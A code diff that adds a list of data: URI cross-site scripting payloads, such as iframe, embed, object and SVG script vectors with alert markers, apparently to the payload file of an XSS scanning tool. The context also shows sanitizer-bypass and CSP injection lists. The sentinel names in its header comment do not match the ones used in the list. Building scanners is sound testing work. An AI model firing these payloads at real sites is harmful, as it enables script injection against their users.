@@ -318,6 +318,29 @@ SANITIZER_BYPASS = [
     "<<a|ascript>alert(`{marker}`)</script>",
 ]
 
+# data: URI injection vectors — plain text/html and base64-encoded SVG/HTML payloads.
+# These use sentinels resolved by payload_gen.py at runtime:
+#   __B64_DATA_URL__:{marker}       → data:text/html;base64,<base64 of <script>alert(marker)</script>>
+#   __B64_SVG_IMG__:{marker}        → <img src="data:image/svg+xml;base64,...">  (SVG with script)
+#   __B64_SVG_IFRAME__:{marker}     → <iframe src="data:image/svg+xml;base64,...">
+DATA_URI = [
+    # Plain text/html data URI — works in iframe src, object data, embed src (no base64)
+    "<iframe src=\"data:text/html,<script>alert('{marker}')</script>\">",
+    "<embed src=\"data:text/html,<script>alert('{marker}')</script>\">",
+    "<object data=\"data:text/html,<script>alert('{marker}')</script>\"></object>",
+    # Meta refresh via base64 data URI — sentinel resolved to full <meta> tag at generate-time
+    "__B64_SCRIPT__:{marker}",
+    # SVG image data URI — executes in img src on some older browsers / XHTML pages
+    "<img src=\"data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert('{marker}')</script></svg>\">",
+    # SVG use element with base64 data URI — sentinel resolved to full <svg><use> tag at generate-time
+    "__B64_SVG_USE__:{marker}",
+    # XHTML data URI
+    "<iframe src=\"data:application/xhtml+xml,<html xmlns='http://www.w3.org/1999/xhtml'>"
+    "<script>alert('{marker}')</script></html>\">",
+    # Base64-encoded text/html data URI — sentinel resolved to full <iframe> tag at generate-time
+    "__B64_HTML_IFRAME__:{marker}",
+]
+
 # CSP header injection payloads — exploiting user-controlled CSP header values
 CSP_INJECTION = [
     # Append unsafe-inline to script-src via semicolon injection
